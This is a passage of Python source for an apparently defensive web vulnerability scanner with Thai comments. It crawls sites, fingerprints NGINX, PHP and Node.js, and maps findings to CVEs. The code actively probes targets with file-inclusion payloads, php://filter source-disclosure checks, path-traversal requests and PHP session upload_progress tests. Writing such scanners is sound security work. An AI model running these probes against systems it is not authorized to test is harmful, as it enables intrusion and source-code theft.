        comb = f"{hdr_blob}\n{txt_head}"
        if not fp.get("nginx_version"):
            m = NGINX_VER_RE.search(comb)
            if m:
                fp["nginx_version"] = m.group(1)
                if fp.get("server_family") in ("Unknown", "OpenResty"):
                    fp["server_family"] = "NGINX"
                if not fp.get("server_version"):
                    fp["server_version"] = m.group(1)
        for m in VERSION_RE.finditer(comb):
            fp["php_versions"].add(m.group(1))
            fp["php_detected"] = True
        sc_c = (resp.headers.get("Set-Cookie", "") or "").lower()
        if any(tok in sc_c for tok in ("phpsessid=", "laravel_session=", "ci_session=", "cakephp=", "wordpress_")):
            fp["php_detected"] = True
        if any(err in txt_head.lower() for err in PHP_ERR_MARKERS):
            fp["php_detected"] = True
        for m in NODE_VER_RE.finditer(comb):
            fp["nodejs_detected"] = True
            if m.group(1) not in fp.get("nodejs_versions", []):
                fp.setdefault("nodejs_versions", []).append(m.group(1))
        for m in NEXT_VER_RE.finditer(comb):
            fp["nodejs_detected"] = True
            fw_tag = f"Next.js {m.group(1)}"
            if fw_tag not in fp.get("nodejs_frameworks", []):
                fp.setdefault("nodejs_frameworks", []).append(fw_tag)
        # component detection ระหว่าง crawl (DB error / admin tool / JS lib จากหน้าอื่น ๆ)
        c_all_hdr = " ".join(f"{k}: {v}" for k, v in resp.headers.items())
        c_sc = resp.headers.get("Set-Cookie", "") or ""
        c_blob = f"{c_all_hdr}\n{c_sc}\n{txt_head}"
        _extract_components(fp, c_blob.lower(), c_blob, txt_head)

    try:
        r0 = session.get(base + "/rmutcert-nonexist-" + uuid.uuid4().hex[:6],
                          timeout=timeout)
        baseline_hash, baseline_status = hash_body(r0.text), r0.status_code
        _enrich_fp(r0)
    except requests.RequestException:
        pass

    while queue and len(visited) < max_pages and (time.time() - _t0) < crawl_budget:
        if len(visited) >= 20 and not endpoints:
            break  # เว็บ CMS ที่ไม่มีพารามิเตอร์/ฟอร์ม — ไม่มีจุดทดสอบ LFI หยุดเร็วเพื่อไม่ให้ค้าง
        url, depth = queue.pop(0)
        if url in visited or depth > max_depth: continue
        p = urlparse(url)
        if f"{p.scheme}://{p.netloc}" != origin: continue
        visited.add(url); all_urls.append(url)
        try:
            r = session.get(url, timeout=timeout, allow_redirects=True)
            _enrich_fp(r)
            if r.status_code >= 400: continue
            if p.query and not is_static(p.path) and not is_noisy(p.path):
                path = p.path or "/"
                if path not in endpoints:
                    endpoints[path] = {"params": set(), "methods": {"get"}}
                endpoints[path]["params"].update(parse_qs(p.query).keys())
            parser = _LinkParser()
            try: parser.feed(r.text)
            except: pass
            for form in parser.forms:
                action = urljoin(url, form["action"])
                if not action.startswith(origin): continue
                a_path = urlparse(action).path or "/"
                if is_static(a_path) or is_noisy(a_path) or not form["inputs"]: continue
                if a_path not in endpoints:
                    endpoints[a_path] = {"params": set(), "methods": set()}
                endpoints[a_path]["methods"].add(form["method"])
                for inp in form["inputs"]: endpoints[a_path]["params"].add(inp)
            for link in parser.links:
                if link.startswith(("javascript:", "mailto:", "tel:", "#", "data:")): continue
                full = urljoin(url, link).split("#")[0]
                if full.startswith(origin) and full not in visited:
                    queue.append((full, depth + 1))
        except requests.RequestException:
            continue
    filtered = {}
    for path, info in endpoints.items():
        if fp is not None and path.lower().endswith(".php"):
            fp["php_detected"] = True
        if not info["params"]: continue
        real = {p for p in info["params"]
                if p.lower() not in ("ver", "v", "_", "cb", "t", "cache")}
        if real: info["params"] = real; filtered[path] = info
    if fp is not None and not fp.get("php_detected"):
        for u in all_urls:
            if urlparse(u).path.lower().endswith(".php"):
                fp["php_detected"] = True
                break
    return filtered, visited, baseline_hash, baseline_status, all_urls


def _detect_session_endpoint(session, base, prefix, timeout):
    for c in ["/login.php", "/api/app.php", "/cart.php", "/account.php", "/"]:
        try:
            r = session.get(base + prefix + c, timeout=timeout, allow_redirects=True)
            if "PHPSESSID" in r.headers.get("Set-Cookie", ""):
                return base + prefix + c
        except requests.RequestException:
            continue
    return base + prefix + "/"


def _probe_preconditions(session, session_url, timeout):
    pc = {"cookie_less_session": None, "upload_progress": None,
          "multipart": None, "meaningful": False, "tested_url": session_url}
    sid = "rmutcert" + uuid.uuid4().hex[:12]
    try:
        r = session.post(session_url, data={"PHPSESSID": sid, "p": "1"},
                          timeout=timeout, allow_redirects=False)
        pc["cookie_less_session"] = "PHPSESSID" in r.headers.get("Set-Cookie", "")
    except requests.RequestException:
        return pc
    try:
        r = session.post(session_url,
                          data={"PHP_SESSION_UPLOAD_PROGRESS": f"x|{sid}",
                                "PHPSESSID": sid},
                          files={"f": ("p.txt", b"X", "text/plain")},
                          timeout=timeout, allow_redirects=False)
        if r.status_code in (200, 302):
            pc["multipart"] = pc["upload_progress"] = pc["meaningful"] = True
        elif r.status_code in (403, 405, 406, 413, 415):
            pc["multipart"] = pc["upload_progress"] = False
    except requests.RequestException:
        pass
    return pc


_rate_lock = Lock()
_last_req = [0.0]

def _rate_limit(rate):
    if rate <= 0: return
    with _rate_lock:
        elapsed = time.time() - _last_req[0]
        wait = max(0, 1.0 / rate - elapsed)
        if wait > 0: time.sleep(wait)
        _last_req[0] = time.time()


def _test_lfi(session, base, path, param, baseline_hash, timeout, rate):
    """FULL — passwd + phpfilter + environ + error detection"""
    test_base = f"{base}{path}"
    marker = "RMUTCERT_" + uuid.uuid4().hex[:10]
    try:
        _rate_limit(rate)
        r = session.get(f"{test_base}?{param}={marker}", timeout=timeout)
        if marker in r.text: return None
        if baseline_hash and hash_body(r.text) == baseline_hash: return None
    except requests.RequestException:
        return None
    results = []
    for payload, ptype, markers in LFI_PAYLOADS:
        try:
            _rate_limit(rate)
            r = session.get(f"{test_base}?{param}={payload}", timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code >= 500: continue
        text = r.text[:100000]
        if markers and all(m in text for m in markers):
            sample = next((l.strip()[:120] for l in text.splitlines()
                            if any(m in l for m in markers)), "")
            results.append({"evidence": f"{ptype} leaked", "confidence": "high",
                            "payload": payload, "sample": sample})
        if ptype == "phpfilter":
            stripped = text.strip()
            if len(stripped) > 100 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", stripped):
                try:
                    dec = base64.b64decode(stripped + "=" * (-len(stripped) % 4))
                    if b"<?php" in dec[:2000] or b"<?=" in dec[:2000]:
                        results.append({"evidence": "PHP source via php://filter",
                                        "confidence": "high", "payload": payload,
                                        "sample": dec[:80].decode("utf-8", "replace")})
                except: pass
        lower = text.lower()
        if any(e in lower for e in PHP_ERR_MARKERS):
            if not any(x["confidence"] == "high" for x in results):
                results.append({"evidence": "PHP include error", "confidence": "medium",
                                "payload": payload, "sample": ""})
    if not results: return None
    best = max(results, key=lambda x: {"high": 2, "medium": 1}[x["confidence"]])
    return {"path": path, "param": param, "url": f"{test_base}?{param}=FUZZ",
            "best_evidence": best["evidence"], "confidence": best["confidence"],
            "payload_used": best["payload"], "sample": best.get("sample", "")}


def _lfi_scan(session, base, endpoints, baseline_hash, timeout, rate, threads):
    tasks = [(p, pr) for p, info in endpoints.items() for pr in info["params"]]
    if not tasks: return []
    results = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_test_lfi, session, base, p, pr, baseline_hash,
                          timeout, rate): (p, pr) for p, pr in tasks}
        for f in as_completed(futs):
            try:
                r = f.result()
                if r: results.append(r)
            except Exception: pass
    seen, uniq = set(), []
    for r in results:
        k = (r["path"], r["param"])
        if k not in seen: seen.add(k); uniq.append(r)
    return uniq


def _probe_quic_udp(host, port=443, timeout=1.5):
    """ส่งแพ็กเก็ต UDP QUIC Initial (Version Negotiation probe ตาม RFC 9000)
    เพื่อยืนยันว่าพอร์ต UDP เปิดรับ HTTP/3 (QUIC) จริง ไม่ใช่แค่โฆษณาใน Alt-Svc header"""
    import socket as _sock
    if not host:
        return False
    try:
        dcid = os.urandom(8)
        scid = os.urandom(8)
        # Long Header (0xc0) + Reserved Version (0xdeadbeef เพื่อกระตุ้น Version Negotiation)
        pkt = b"\xc0\xde\xad\xbe\xef" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
        pkt += b"\x00" * (1200 - len(pkt))
        with _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM) as usock:
            usock.settimeout(min(timeout, 1.8))
            usock.sendto(pkt, (host, int(port or 443)))
            resp, _ = usock.recvfrom(2048)
            # QUIC Long Header response ต้องขึ้นต้นด้วย bit 1 (0x80) และมีความยาวอย่างน้อย 7 ไบต์
            if resp and len(resp) >= 7 and (resp[0] & 0x80):
                return True
    except Exception:
        pass
    return False


def _probe_nginx_hints(session, base, prefix, fp, all_urls, timeout):
    """ตรวจสอบหลักฐานเชิงพฤติกรรม (Preconditions) ของช่องโหว่ NGINX ทั้ง 5 รายการ"""
    hints = {
        "ssi_files": [],
        "http3": bool(fp.get("http3_hint")),
        "http3_udp_verified": False,
        "http3_body_accepted": False,
        "tls": bool(fp.get("tls_hint")),
        "tls_ticket_supported": fp.get("tls_ticket_supported"),
        "tls_session_reused": fp.get("tls_session_reused"),
        "tls_ticket_inconsistent": bool(fp.get("tls_ticket_inconsistent")),
        "alias_rewrite": None,
        "map_regex": None,
    }
    t_short = min(timeout, 4.0)

    # 1) ตรวจหาไฟล์ SSI (.shtml / .shtm / .stm) จาก URL ที่ crawl พบ + path มาตรฐาน (CVE-2026-97205)
    ssi_cands = ["/index.shtml", "/index.shtm"]
    for u in (all_urls or []):
        up = urlparse(u).path
        if up and up.lower().endswith((".shtml", ".shtm", ".stm")) and up not in ssi_cands:
            ssi_cands.append(up)
    for p in ssi_cands[:6]:
        try:
            r = session.get(base + prefix + p, timeout=t_short)
            if not fp.get("nginx_version"):
                m = NGINX_VER_RE.search(r.headers.get("Server", "") + "\n" + (r.text or "")[:4000])
                if m:
                    fp["nginx_version"] = m.group(1)
            if r.status_code == 200 and ("<!--#" in r.text or "include virtual" in r.text or p.lower().endswith((".shtml", ".shtm"))):
                if "text/html" in r.headers.get("Content-Type", "").lower():
                    hints["ssi_files"].append(p)
        except requests.RequestException:
            pass

    # เฉพาะกรณีที่เข้าข่าย NGINX หรือยังไม่ทราบชนิดเซิร์ฟเวอร์ชัดเจน
    if fp.get("server_family") not in ("NGINX", "OpenResty", "Unknown"):
        return hints

    # 2) ยืนยัน HTTP/3 (QUIC) บนพอร์ต UDP จริง + ทดสอบการรับ Request Body (CVE-2026-95101)
    host = urlparse(base).hostname
    h3_port = fp.get("http3_port", 443)
    if base.startswith("https://") and host:
        hints["http3_udp_verified"] = _probe_quic_udp(host, h3_port, timeout=1.5)
        if hints["http3_udp_verified"]:
            hints["http3"] = True
        if hints["http3"]:
            try:
                rp = session.post(base + prefix + "/", data=b"x=1", timeout=t_short, allow_redirects=False)
                if rp.status_code not in (405, 413, 501):
                    hints["http3_body_accepted"] = True
            except requests.RequestException:
                pass

    # 3) ทดสอบพฤติกรรม alias + rewrite off-by-slash / path traversal normalization (CVE-2026-15176)
    prefix_cands = []
    for u in (all_urls or []):
        parts = [seg for seg in urlparse(u).path.split("/") if seg]
        if parts:
            cand = "/" + parts[0]
            if cand not in prefix_cands and "." not in parts[0]:
                prefix_cands.append(cand)
    for std_p in ("/static", "/assets", "/uploads", "/media", "/public", "/files"):
        if std_p not in prefix_cands:
            prefix_cands.append(std_p)

    # เทียบสถานะ baseline ของ path ที่ไม่มีอยู่จริง
    base_404_code = 404
    try:
        r_b = session.get(f"{base}{prefix}/rmutcert_noalias_{uuid.uuid4().hex[:6]}../",
                          timeout=t_short, allow_redirects=False)
        base_404_code = r_b.status_code
        if not fp.get("nginx_version"):
            m = NGINX_VER_RE.search(r_b.headers.get("Server", "") + "\n" + (r_b.text or "")[:4000])
            if m:
                fp["nginx_version"] = m.group(1)
    except requests.RequestException:
        pass

    for pfx in prefix_cands[:5]:
        try:
            r_norm = session.get(f"{base}{prefix}{pfx}/", timeout=t_short, allow_redirects=False)
            if r_norm.status_code in (200, 301, 302, 403):
                r_trav = session.get(f"{base}{prefix}{pfx}../", timeout=t_short, allow_redirects=False)
                loc = r_trav.headers.get("Location", "")
                # หาก /prefix../ ต่างจาก baseline 404 (เช่นได้ 403/200 หรือถูก rewrite redirect แปลก)
                if r_trav.status_code in (200, 403) and r_trav.status_code != base_404_code:
                    hints["alias_rewrite"] = f"{pfx}../ (HTTP {r_trav.status_code})"
                    break
                if r_trav.status_code in (301, 302, 307, 308) and loc and pfx.lstrip("/") in loc:
                    hints["alias_rewrite"] = f"{pfx} → rewrite ({loc[:60]})"
                    break
        except requests.RequestException:
            continue

    # 4) ทดสอบพฤติกรรม map + regex capture redirect/routing (CVE-2026-93479)
    try:
        probe_tok = "rmutmap" + uuid.uuid4().hex[:6]
        r_map = session.get(f"{base}{prefix}/{probe_tok}?redirect={probe_tok}",
                            headers={"X-Forwarded-Host": urlparse(base).netloc},
                            timeout=t_short, allow_redirects=False)
        loc = r_map.headers.get("Location", "")
        if r_map.status_code in (301, 302, 307, 308) and probe_tok in loc:
            hints["map_regex"] = f"สะท้อนค่า regex capture ใน Location ({r_map.status_code} → {loc[:60]})"
    except requests.RequestException:
        pass

    return hints


def _analyze_nginx(fp, hints):
    results = {}
    is_nginx = fp.get("server_family") in ("NGINX", "OpenResty") or bool(fp.get("nginx_version"))
    vt = parse_semver(fp.get("nginx_version")) if fp.get("nginx_version") else None
    ver_str = fp.get("nginx_version") or ""
    cdn = fp.get("cdn_proxy")

    for cve, ranges in NGINX_VULN.items():
        d = NGINX_CVE_DESCS[cve]
        e = {"cve": cve, "name": d["name"], "severity": d["severity"],
             "trigger": d["trigger"], "host_check": d["host_check"],
             "status": "unknown", "reason": ""}
        if not is_nginx:
            e["status"] = "n/a"
            e["reason"] = "ไม่ใช่ NGINX"
            results[cve] = e
            continue

        # กรณีทราบเวอร์ชัน NGINX: ตรวจช่วงเวอร์ชันก่อน
        if vt:
            in_range_flag = any(in_range(vt, lo, hi) for lo, hi in ranges)
            if not in_range_flag:
                e["status"] = "patched"
                e["reason"] = f"NGINX {ver_str} แพตช์แล้ว (อยู่นอกช่วงที่ได้รับผลกระทบ)"
                results[cve] = e
                continue

        # ── แยกตรวจตามเงื่อนไขเฉพาะของแต่ละ CVE (ทั้งกรณีทราบและไม่ทราบเวอร์ชัน) ──
        if cve == "CVE-2026-97629":  # TLS Session Ticket Forgery
            if not hints.get("tls"):
                e["status"] = "not-exploitable"
                e["reason"] = "ไม่ได้เปิดใช้งาน HTTPS/TLS จึงไม่ใช้ TLS Session Tickets"
            elif hints.get("tls_ticket_supported") is False:
                e["status"] = "mitigated"
                e["reason"] = "เซิร์ฟเวอร์ปิดการใช้ TLS Session Tickets (ssl_session_tickets off)"
            elif hints.get("tls_ticket_inconsistent"):
                if cdn:
                    # หลัง LB/CDN ticket key ต่างกันตามปกติ — ความไม่สอดคล้องไม่ชี้ขาดว่าเป็น CVE นี้
                    e["status"] = "likely-vulnerable" if vt else "not-exploitable"
                    e["reason"] = (f"พบ Ticket ไม่สอดคล้องข้าม worker แต่โฮสต์อยู่หลัง {cdn} (LB/Proxy) "
                                   f"ซึ่งทำให้ ticket key ต่างกันโดยปกติ ไม่ใช่ช่องโหว่ของ NGINX ต้นทาง")
                else:
                    e["status"] = "vulnerable" if vt else "vulnerable-conditions"
                    e["reason"] = (f"NGINX {ver_str or '(ซ่อนเวอร์ชัน)'} เปิด TLS Session Tickets และพบความไม่สอดคล้องของ Ticket ข้าม worker "
                                   f"(บ่งชี้ว่า ticket key ไม่ได้ init ร่วมกัน)")
            elif hints.get("tls_ticket_supported") is True:
                reused_txt = "ยืนยัน Resumption สำเร็จ" if hints.get("tls_session_reused") else "พบการออก Session Ticket"
                if vt:
                    e["status"] = "likely-vulnerable"
                    e["reason"] = f"NGINX {ver_str} กระทบ + เปิดใช้ TLS Session Tickets ({reused_txt}) — ตรวจ ssl_session_ticket_key"
                else:
                    # ซ่อนเวอร์ชัน + ทดสอบซ้ำแล้ว Ticket สอดคล้องกันปกติ ไม่พบความผิดปกติของ worker ticket key
                    e["status"] = "not-exploitable"
                    e["reason"] = f"เปิดใช้ TLS Session Tickets ({reused_txt}) และผลทดสอบข้ามการเชื่อมต่อสอดคล้องกันปกติ (ไม่พบอาการ Ticket Key ผิดปกติ)"
            else:
                e["status"] = "vulnerable-version" if vt else "not-exploitable"
                e["reason"] = (f"NGINX {ver_str} อยู่ในช่วงกระทบ — ตรวจสอบสถานะ TLS Ticket เพิ่มเติมบนเครื่อง"
                               if vt else "ตรวจไม่พบการออก TLS Session Ticket ที่มีปัญหา")

        elif cve == "CVE-2026-95101":  # HTTP/3 Request Body Injection
            udp_ok = hints.get("http3_udp_verified")
            h3_hdr = hints.get("http3")
            body_ok = hints.get("http3_body_accepted")
            if udp_ok and not cdn:
                body_txt = " + รับ Request Body" if body_ok else ""
                if vt:
                    e["status"] = "vulnerable" if body_ok else "likely-vulnerable"
                    e["reason"] = f"NGINX {ver_str} กระทบ + ยืนยันพอร์ต UDP QUIC (HTTP/3) ตอบสนองจริง{body_txt}"
                else:
                    e["status"] = "vulnerable-conditions"
                    e["reason"] = f"ยืนยันพอร์ต UDP QUIC (HTTP/3) ตอบสนองจริง{body_txt} (ซ่อนเวอร์ชัน NGINX — ต้องตรวจรุ่นบนเครื่อง)"
            elif h3_hdr and not udp_ok:
                if cdn:
                    e["status"] = "not-exploitable"
                    e["reason"] = f"Alt-Svc: h3 มาจาก {cdn} CDN/Proxy ด้านหน้า ไม่ใช่ QUIC บน NGINX ต้นทางโดยตรง"
                else:
                    e["status"] = "mitigated" if not vt else "vulnerable-version"
                    e["reason"] = (f"NGINX {ver_str} กระทบและส่ง Alt-Svc: h3 แต่พอร์ต UDP QUIC ไม่ตอบสนอง (ถูกบล็อกที่ไฟร์วอลล์/Proxy)"
                                   if vt else "พบ Alt-Svc: h3 ใน header แต่พอร์ต UDP QUIC ปิดหรือถูกกรอง")
            else:
                e["status"] = "not-exploitable"
                e["reason"] = (f"NGINX {ver_str} ไม่ได้เปิดใช้งาน HTTP/3 (ไม่พบ Alt-Svc: h3 และพอร์ต UDP QUIC ไม่ตอบสนอง)"
                               if vt else "ไม่ได้เปิดใช้งาน HTTP/3 (ไม่พบ Alt-Svc: h3 และพอร์ต UDP QUIC ไม่ตอบสนอง)")

        elif cve == "CVE-2026-97205":  # Use-After-Free (AIO + SSI)
            if hints.get("ssi_files"):
                if vt:
                    e["status"] = "likely-vulnerable"
                    e["reason"] = f"NGINX {ver_str} กระทบ + พบการใช้งาน SSI: {hints['ssi_files']}"
                else:
                    e["status"] = "vulnerable-conditions"
                    e["reason"] = f"พบการใช้งาน SSI ({hints['ssi_files']}) บน NGINX ที่ซ่อนเวอร์ชัน — ต้องตรวจรุ่นและ aio on"
            elif vt:
                e["status"] = "vulnerable-version"
                e["reason"] = f"NGINX {ver_str} อยู่ในช่วงกระทบ (ไม่พบไฟล์ .shtml สาธารณะ — ตรวจ aio on + ssi on ใน nginx -T)"
            else:
                e["status"] = "not-exploitable"
                e["reason"] = "ตรวจไม่พบการเปิดใช้งานไฟล์ SSI (.shtml/.shtm) บนเซิร์ฟเวอร์ (ไม่เข้าเงื่อนไขตัวกระตุ้น AIO + SSI)"

        elif cve == "CVE-2026-15176":  # Heap Buffer Overflow (alias + rewrite)
            if hints.get("alias_rewrite"):
                if vt:
                    e["status"] = "likely-vulnerable"
                    e["reason"] = f"NGINX {ver_str} กระทบ + พบพฤติกรรมเข้าข่าย alias/rewrite ที่ {hints['alias_rewrite']}"
                else:
                    e["status"] = "vulnerable-conditions"
                    e["reason"] = f"พบพฤติกรรมเข้าข่าย alias/rewrite ที่ {hints['alias_rewrite']} (ซ่อนเวอร์ชัน NGINX — ต้องตรวจรุ่นและ alias/rewrite ใน nginx -T)"
            elif vt:
                e["status"] = "vulnerable-version"
                e["reason"] = f"NGINX {ver_str} อยู่ในช่วงกระทบ — ต้องยืนยันการใช้ alias คู่กับ rewrite ใน nginx -T"
            else:
                e["status"] = "not-exploitable"
                e["reason"] = "ทดสอบ path normalization แล้วไม่พบพฤติกรรม alias + rewrite traversal ที่เข้าเงื่อนไขช่องโหว่"

        elif cve == "CVE-2026-93479":  # Heap Buffer Overflow (map + regex)
            if hints.get("map_regex"):
                if vt:
                    e["status"] = "likely-vulnerable"
                    e["reason"] = f"NGINX {ver_str} กระทบ + พบพฤติกรรม routing/redirect แบบเงื่อนไข ({hints['map_regex']})"
                else:
                    e["status"] = "vulnerable-conditions"
                    e["reason"] = f"พบพฤติกรรม routing/redirect แบบเงื่อนไข ({hints['map_regex']}) บน NGINX ที่ซ่อนเวอร์ชัน — ต้องตรวจรุ่นและ map ใน nginx -T"
            elif vt:
                e["status"] = "vulnerable-version"
                e["reason"] = f"NGINX {ver_str} อยู่ในช่วงกระทบ — ต้องยืนยันการใช้ map regex capture ใน nginx -T"
            else:
                e["status"] = "not-exploitable"
                e["reason"] = "ทดสอบ routing/redirect แล้วไม่พบการสะท้อนค่า regex capture ใน Location ที่เข้าเงื่อนไขช่องโหว่"

        results[cve] = e

    # ── เทียบ CVE ย้อนหลังตามเลขเวอร์ชัน nginx (affected range → fixed version) ──
    # เช่น CVE-2021-23017 (resolver off-by-one) กระทบ 0.6.18–1.20.0 แก้ใน 1.20.1/1.21.0
    if is_nginx and vt:
        for cid, hf in _match_historical_cves("NGINX", vt, fp).items():
            results.setdefault(cid, hf)
        uf = _unsupported_finding("NGINX", vt)
        if uf:
            results[uf["cve"]] = uf
    return results


def _analyze_php(fp, pc):
    results = {}
    versions = [parse_semver(v) for v in fp["php_versions"] if parse_semver(v)]
    php_detected = bool(fp.get("php_detected")) or bool(versions)
    _STATUS_WEIGHT = {"vulnerable": 4, "unpatched": 3, "patched": 2, "n/a": 1, "unknown": 0}
    worst = max((classify_php(v) for v in versions), key=lambda s: _STATUS_WEIGHT.get(s, 0), default="unknown") if versions else "unknown"

    e1 = {"cve": "CVE-2026-109618", "name": "Use-After-Free (OOM)",
          "severity": "Critical", "trigger": "mod_php / PHP-FPM",
          "host_check": "php -v && php -i | grep 'Server API'",
          "status": "unknown", "reason": ""}
    if not php_detected:
        e1["status"] = "n/a"
        e1["reason"] = "ตรวจไม่พบการใช้งาน PHP บนเซิร์ฟเวอร์นี้"
    elif not versions:
        e1["status"] = "unknown"
        e1["reason"] = "ตรวจพบการใช้งาน PHP แต่เซิร์ฟเวอร์ซ่อนหมายเลขเวอร์ชัน — ต้องตรวจ php -v บนเครื่องจริง"
    elif worst == "patched": e1["status"] = "patched"; e1["reason"] = "PHP แพตช์แล้ว"
    elif worst == "n/a":
        e1["status"] = "n/a"
        ver_str = ".".join(str(x) for x in versions[0]) if versions else "?"
        e1["reason"] = f"PHP {ver_str} ไม่ได้รับผลกระทบ — CVE-2026-109618/109619 เฉพาะ PHP 8.2/8.3/8.4/8.5"
    elif fp["sapi"] == "mod_php": e1["status"] = "high-risk"; e1["reason"] = "PHP เปราะ + mod_php"
    elif fp["sapi"] == "php-fpm": e1["status"] = "medium-risk"; e1["reason"] = "PHP เปราะ + PHP-FPM"
    else: e1["status"] = "vulnerable"; e1["reason"] = f"PHP {worst}"
    results["CVE-2026-109618"] = e1

    e2 = {"cve": "CVE-2026-109619", "name": "Use-After-Free (stale)",
          "severity": "Critical", "trigger": "session.upload_progress",
          "host_check": "php -i | grep session.upload_progress",
          "status": "unknown", "reason": ""}
    if not php_detected:
        e2["status"] = "n/a"
        e2["reason"] = "ตรวจไม่พบการใช้งาน PHP บนเซิร์ฟเวอร์นี้"
    elif not versions:
        if not pc.get("meaningful"):
            e2["status"] = "not-exploitable"
            e2["reason"] = "ตรวจพบ PHP (ซ่อนเวอร์ชัน) แต่ไม่ใช้ PHP Session จึงไม่เข้าเงื่อนไขช่องโหว่นี้"
        elif pc.get("upload_progress") is False:
            e2["status"] = "mitigated"
            e2["reason"] = "ตรวจพบ PHP (ซ่อนเวอร์ชัน) แต่ upload_progress ปิด/บล็อกจากภายนอก"
        else:
            e2["status"] = "unknown"
            e2["reason"] = "ตรวจพบการใช้งาน PHP + Session แต่ซ่อนเวอร์ชัน PHP — ต้องตรวจรุ่นและ session.upload_progress บนเครื่อง"
    elif worst == "patched": e2["status"] = "patched"; e2["reason"] = "PHP แพตช์แล้ว"
    elif worst == "n/a":
        e2["status"] = "n/a"
        ver_str = ".".join(str(x) for x in versions[0]) if versions else "?"
        e2["reason"] = f"PHP {ver_str} ไม่ได้รับผลกระทบ — CVE-2026-109618/109619 เฉพาะ PHP 8.2/8.3/8.4/8.5"
    elif not pc.get("meaningful"): e2["status"] = "not-exploitable"; e2["reason"] = "ไม่ใช้ session"
    elif pc.get("upload_progress") is True:
        e2["status"] = "vulnerable"
        e2["reason"] = "PHP เปราะ + session + upload_progress reachable — เข้าเงื่อนไข UAF stale reference"
    elif pc.get("upload_progress") is False:
        e2["status"] = "mitigated"
        e2["reason"] = "PHP เปราะ แต่ upload_progress ปิด/บล็อก (session.upload_progress.enabled=0) — ลด attack surface ได้"
    else:
        e2["status"] = "vulnerable-version"
        e2["reason"] = "PHP เปราะ + ใช้ session แต่ทดสอบ upload_progress ไม่ได้ — ตรวจ session.upload_progress.enabled บนเครื่อง"
    results["CVE-2026-109619"] = e2

    # ── เทียบ CVE ย้อนหลังตามเลขเวอร์ชัน PHP (affected range → fixed version) ──
    # เช่น CVE-2019-11043 (PHP-FPM RCE) กระทบ 7.2.0–7.2.23 แก้ใน 7.2.24 — รุ่นเก่าที่ CVE ปี 2026
    # ไม่ครอบคลุม จะถูกตรวจจับที่นี่แทน (แทนการเทียบวัน EOL ตรงๆ)
    for v in versions:
        for cid, hf in _match_historical_cves("PHP", v, fp).items():
            results.setdefault(cid, hf)
    # ── ตรวจสาขา EOL (จำเป็นเพราะ CVE DB ไม่ระบุรุ่นเก่ามาก เช่น 5.4.45) ──
    if versions:
        uf = _unsupported_finding("PHP", min(versions))
        if uf:
            results[uf["cve"]] = uf
    return results


def _analyze_115560(fp, pc):
    r = {"cve": CVE_115560["cve"], "name": CVE_115560["name"],
         "severity": CVE_115560["severity"], "trigger": CVE_115560["trigger"],
         "host_check": CVE_115560["host_check"],
         "mitigation": CVE_115560["mitigation"],
         "status": "unknown", "reason": ""}
    php_detected = bool(fp.get("php_detected")) or bool(fp.get("php_versions"))
    if not php_detected:
        r["status"] = "n/a"; r["reason"] = "ตรวจไม่พบการใช้งาน PHP บนเซิร์ฟเวอร์นี้"
    elif not pc.get("meaningful"): r["status"] = "not-exploitable"; r["reason"] = "ไม่ใช้ PHP session"
    elif pc.get("upload_progress") is True:
        r["status"] = "vulnerable-conditions"
        r["reason"] = "พบการใช้ PHP session + upload_progress reachable → ตรวจ serialize_handler (php.ini: session.upload_progress.enabled=1)"
    elif pc.get("upload_progress") is False:
        r["status"] = "mitigated"
        r["reason"] = "upload_progress ปิด/บล็อกจากภายนอก (session.upload_progress.enabled=0 หรือ firewall กรอง)"
    else:
        r["status"] = "unknown"
        r["reason"] = "พบการใช้ PHP session แต่ทดสอบ upload_progress reachability ไม่ได้ — ตรวจ php.ini: session.upload_progress.enabled บนเครื่อง"
    return r


NODEJS_CVES = {
    "CVE-2026-105482": {"name": "Node.js DNS NUL Domain Bypass", "severity": "High",
        "host_check": "node -v   # ตรวจรุ่น Node.js (ต้อง >= 18.20.8 / 20.19.2 / 22.15.1 / 23.11.1) และ c-ares"},
    "CVE-2026-105483": {"name": "Node.js TLS Cert Validation (Unicode IP)", "severity": "High",
        "host_check": "node -v   # ตรวจรุ่น Node.js ที่แก้การตรวจใบรับรอง TLS (>= 20.19.2 / 22.15.1)"},
    "CVE-2026-106069": {"name": "Node.js TLS Identity Bypass (non-standard IP)", "severity": "High",
        "host_check": "node -v   # ตรวจรุ่น Node.js ที่แก้ checkServerIdentity (>= 20.19.2 / 22.15.1)"},
    "CVE-2026-111497": {"name": "Node.js Brotli OOB Write (RCE)", "severity": "Critical",
        "host_check": "node -v   # ตรวจรุ่น Node.js (>= 20.19.2 / 22.15.1 / 23.11.1) และการบีบอัด Brotli (zlib/undici)"},
}
NODEJS_SIGNS = ("express", "next.js", "nextjs", "nuxt", "fastify", "koa",
                "node.js", "nodejs", "undici", "sveltekit", "remix", "hapi",
                "nestjs", "adonis", "sails", "meteor", "astro")
URL_FETCH_PARAMS = {"url", "uri", "redirect", "redirect_uri", "returnurl", "next", "callback",
                    "webhook", "proxy", "dest", "destination", "domain", "host", "endpoint",
                    "fetch", "src", "image", "load", "target", "feed", "rss"}


def _nodejs_probe(session, base, prefix, fp, endpoints, all_urls, timeout):
    """ตรวจเชิงลึกสำหรับ Node.js:
    1) สกัดเวอร์ชัน Node.js / Framework จาก headers, cookies, HTML, /metrics, /version, /health, error stack
    2) ทดสอบการรับ/ประมวลผลข้อมูลบีบอัด Brotli (Content-Encoding: br / Accept-Encoding: br) สำหรับ CVE-2026-111497
    3) ตรวจหาจุดรับ URL/Outbound Fetch (เช่น /_next/image หรือพารามิเตอร์ url/webhook/domain) สำหรับ CVE-2026-105482/105483/106069
    """
    headers = fp.get("headers", {}) or {}
    # ตรวจเฉพาะ header ที่บ่งชี้เทคโนโลยีเซิร์ฟเวอร์จริง (ไม่ตรวจมั่วทุก header เพื่อกัน false match)
    tech_hdr_blob = " ".join(
        " ".join(headers.get(hk, []))
        for hk in ("x-powered-by", "server", "via", "x-nextjs-cache", "x-nextjs-matched-path", "x-sveltekit-page", "x-remix-response")
    ).lower()
    matched_sigs = [sig for sig in NODEJS_SIGNS if re.search(r"(?<![a-z0-9])" + re.escape(sig) + r"(?![a-z0-9])", tech_hdr_blob)]
    detected = bool(fp.get("nodejs_detected")) or bool(matched_sigs)
    node_vers = set(fp.get("nodejs_versions") or [])
    frameworks = set(fp.get("nodejs_frameworks") or [])
    for sig in matched_sigs:
        frameworks.add(sig)

